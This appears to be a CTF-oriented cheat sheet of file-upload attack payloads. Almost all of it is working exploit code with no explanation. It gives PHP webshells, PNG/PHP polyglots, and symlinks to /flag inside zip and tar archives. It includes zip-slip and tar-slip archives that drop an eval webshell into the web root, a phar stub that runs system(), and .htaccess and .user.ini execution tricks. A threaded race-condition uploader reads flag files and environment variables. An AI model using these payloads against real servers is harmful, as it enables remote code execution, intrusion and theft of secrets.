# rockyou.7z

```shell
...
```



# png.png

```shell
...
```



# php.php

```php
<?=`ls`;
```



# phtml.phtml

```pthml
<?=`ls`;
```



# payload.php.png

```shell
copy /b png.png + php.php payload.php.png
```





# payload.phtml.png

```shell
copy /b png.png + phtml.phtml payload.php.png
```



# flag.txt

```shell
ln -s /flag flag.txt
```



# flag.zip

```shell
ln -s /flag flag.txt
zip flag.zip flag.txt
```



# flag.tar

```shell
ln -s /flag flag.txt
tar -cf flag.tar flag.txt
```



# zip.zip

```python
import zipfile
with zipfile.ZipFile('zip.zip', 'w') as zf:
    zf.writestr('../../../../../../../../var/www/html/php.php', "<?php @eval($_GET['cmd']);?>")
```



# tar.tar

```python
import tarfile
import io

with tarfile.open('tar.tar', 'w') as tf:
    content = b"<?php @eval($_GET['cmd']);?>"
    
    tarinfo = tarfile.TarInfo(name='../../../../../../../../var/www/html/php.php')
    tarinfo.size = len(content)
    
    tf.addfile(tarinfo, fileobj=io.BytesIO(content))
```



# phar.phar.gz

```php
<?php
$phar = new Phar('phar.phar');
$phar->startBuffering();

$stub = <<<'STUB'
<?php
    system('ls /');
    __HALT_COMPILER();
?>
STUB;

$phar->setStub($stub);
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();

?>
```

```shell
D:\Environment\php\php-8.4.13\php.exe -d phar.readonly=0 D:\Work\test\php\1\main.php
```

```shell
gzip phar.phar
```



# .htaccess

```apache
AddType application/x-httpd-php .txt
```



# .user.ini

```shell
auto_append_file=/var/log/nginx/access.log 
```





# txt.php

## 窗口竞争

```shell
<?php $o=shell_exec('cat /f* 2>&1;env');@file_put_contents(__DIR__.'/o.txt',$o);echo $o; ?>
```



# txt.py

## 窗口竞争

```python
import threading
import requests

uri = "http://127.0.0.1:1938"
payload = b"<?php $o=shell_exec('cat /f* 2>&1');@file_put_contents(__DIR__.'/o.txt',$o);echo $o; ?>"

hit = threading.Event()

def upload():
    while not hit.is_set():
        try:
            requests.post(uri + "/submit",
                          files={"file": ("txt.php", payload)},
                          timeout=5)
        except requests.RequestException:
            pass


def fetch():
    while not hit.is_set():
        try:
            r = requests.get(uri + "/private/txt.php",
                             timeout=5)
            if r.status_code == 200:
                print("[+] hit!\n" + r.text)
                hit.set()
        except requests.RequestException:
            pass


threads = [threading.Thread(target=upload),
           threading.Thread(target=fetch),
           threading.Thread(target=fetch)]

for t in threads:
    t.start()
for t in threads:
    t.join()

print("[*] o.txt:\n" + requests.get(uri + "/private/o.txt", timeout=5).text)
```
